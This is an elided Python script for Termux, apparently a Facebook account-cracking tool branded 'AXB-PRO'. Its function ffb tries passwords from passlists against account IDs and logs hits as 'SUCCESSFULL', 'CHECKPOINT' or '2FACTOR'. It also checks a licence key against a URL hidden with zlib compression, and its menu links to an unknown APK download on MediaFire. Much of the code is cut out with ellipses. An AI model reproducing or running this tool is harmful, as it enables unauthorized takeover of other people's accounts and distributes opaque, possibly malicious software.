...
uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.mrakingxxx-cov', 'r').read()
kex=(f"AXB-XD{uid}TS{key1}PX110E==")
...
def chk():
        ...
        if ua not in urll:
                ...
                if kex in requests.get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O,((\xabH\xd1K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd274\xd4\x07\x8ag\x94\xe4\xe6\x00\x00U\xba\x0e\xd8')).text:
                        print(' Wair for AXB New update ');exit()
                else:
...
try:
        ...
        if updt in linx:
                ...
                print('\n AXB-PRO Update Done Wait for installing...\n')
        ...
        try:
                ...
                if kex in link:
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-openhttps://call.whatsapp.com/video/cnHD2ToWsKbCbiyeB0G3Ai');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/AKING_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100000548098576&mibextid=ZbWKwL');menu()
                        elif xd in ['0','00']:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [A Z A N] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[AXB-2FACTOR] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [AXB-SUCCESSFULL] '+str(uid)+' | '+pas+'\033[1;97m')
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [AXB-CHECKPOINT] '+str(uid)+' | '+pas+'\033[1;97m')
